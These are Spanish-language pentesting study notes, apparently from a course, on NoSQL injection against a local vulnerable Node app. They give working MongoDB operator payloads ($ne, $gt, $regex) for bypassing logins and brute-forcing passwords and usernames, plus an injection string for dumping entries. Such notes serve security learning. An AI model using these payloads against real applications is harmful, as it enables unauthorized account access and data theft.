---
tags:
  - Web
  - Explotacion
  - NoSQL
---


# Notas

Esta vulnerabilidad se presentan en las webs que tienen las base de datos NoSQL.
Algunas bases de datos de este tipo son `MongoDB`, `Cassandra`, `CouchDB` y `FirebaseDB`.

En al pagina de PayloadsAllTheThings podemos buscar diferentes payloads para utilizar
https://github.com/swisskyrepo/PayloadsAllTheThings

## Authentication Bypass

Interceptamos la petición con Burp Suite o Caido y lo pasamos al repiter o replay.

**PETICIÓN:**
```http
POST /user/login HTTP/1.1
Host: localhost:4000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Referer: http://localhost:4000/user/login
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 39
Origin: http://localhost:4000
DNT: 1
Connection: keep-alive
Cookie: wp-settings-time-1=1744452991
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

{"username":"admin","password":"12345"}
```


**LOGUEARSE SABIENDO EL USUARIO**

Nosotros sabemos el usuario, pero no sabemos la contraseña.
Para ello podemos poner condiciones de la siguiente manera:
```http
POST /user/login HTTP/1.1
...

{"username":"admin","password":{"$ne":"123456"}}
```

Otras opciones para explotar el login:

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
```


Otra manera es mediante expresión regular, con esto nos permite realizar fuerza bruta con Burp o Caido.

```json
{"username":"admin","password":{"$regex":"^a"}}
```

`Se puede crear un script que por fuerza bruta nos saque la contraseña`

https://github.com/lBENDUl/NoSQLI_Discovery

**BUSQUEDA DE USUARIOS**

Si queremos buscar usuarios podemos aplicar expresiones regulares de la siguiente manera:

```json
{"username":{"$regex":"^a"},"password":{"$ne":"123456"}}
```

`Podemos ir probando, incluso realizar ataque de fuerza bruta con Burp o Caido para buscar nuevos usuarios`.

## Visualización de datos

En el caso de que veamos una entrada que dependiendo de lo que pongamos nos muestra un usuario o datos.

Lo que se puede realizar es cambiar la petición que se envía de GET a POST
Cambiar el `Content-Type` a `application/json` y en la data meter datos formato JSON.

Aquí podemos vulnerarlo también con inyección.

--- 

En **MONGO DB** hay una inyección común para ver todas las entradas, es la siguiente:

```
admin'||'1'=='1
```



# Hack4u

Las **inyecciones NoSQL** son una vulnerabilidad de seguridad en las aplicaciones web que utilizan bases de datos NoSQL, como MongoDB, Cassandra y CouchDB, entre otras. Estas inyecciones se producen cuando una aplicación web permite que un atacante envíe datos maliciosos a través de una consulta a la base de datos, que luego puede ser ejecutada por la aplicación sin la debida validación o sanitización.

La inyección NoSQL funciona de manera similar a la inyección SQL, pero se enfoca en las vulnerabilidades específicas de las bases de datos NoSQL. En una inyección NoSQL, el atacante aprovecha las consultas de la base de datos que se basan en **documentos** en lugar de tablas relacionales, para enviar datos maliciosos que pueden manipular la consulta de la base de datos y obtener información confidencial o realizar acciones no autorizadas.

A diferencia de las inyecciones SQL, las inyecciones NoSQL explotan la falta de validación de los datos en una consulta a la base de datos NoSQL, en lugar de explotar las debilidades de las consultas SQL en las **bases de datos relacionales**.

A continuación, se proporciona el enlace al proyecto de Github que nos descargamos para poner en práctica esta vulnerabilidad:

- **Vulnerable-Node-App**: [https://github.com/Charlie-belmer/vulnerable-node-app](https://github.com/Charlie-belmer/vulnerable-node-app)

# Laboratorios

A continuación, se proporciona el enlace al proyecto de Github que nos descargamos para poner en práctica esta vulnerabilidad:

- **Vulnerable-Node-App**: [https://github.com/Charlie-belmer/vulnerable-node-app](https://github.com/Charlie-belmer/vulnerable-node-app)